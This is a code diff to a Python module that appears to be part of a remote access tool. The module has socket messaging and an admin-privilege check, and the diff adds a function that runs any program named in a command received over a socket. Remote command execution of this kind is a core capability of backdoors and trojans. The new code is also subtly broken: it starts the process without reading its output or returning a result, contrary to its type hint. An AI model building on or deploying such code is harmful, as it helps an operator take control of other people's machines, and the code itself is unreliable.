@@ -1,6 +1,6 @@
 from socket_handlers import *
 from urllib.parse import unquote
-import os, base64, binascii, requests, ctypes
+import os, base64, binascii, requests, ctypes, subprocess
 from pathvalidate import sanitize_filename, sanitize_filepath
 from typing import Tuple
 
@@ -206,4 +206,32 @@ def check_admin_privileges(socket) -> Tuple[bool, str]:
     except Exception as e:
         error_type = type(e).__name__
         socket_send(socket, f"[!] Privilege Check Error: {error_type}")
+        return False
+
+
+def execute_program(socket, command: str) -> Tuple[bool, str]:
+    try:
+        executable = command[4:] if command.startswith("run ") else command
+
+        if not executable.strip():
+            socket_send(socket, "[!] Empty command")
+            return False
+
+        process = subprocess.Popen(
+            executable,
+            shell=False,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdin=subprocess.PIPE,
+        )
+
+    except FileNotFoundError:
+        socket_send(socket, "[!] Program not found")
+        return False
+    except PermissionError:
+        socket_send(socket, "[!] Permission denied")
+        return False
+    except Exception as e:
+        error_type = type(e).__name__
+        socket_send(socket, f"[!] Execution failed ({error_type})")
         return False
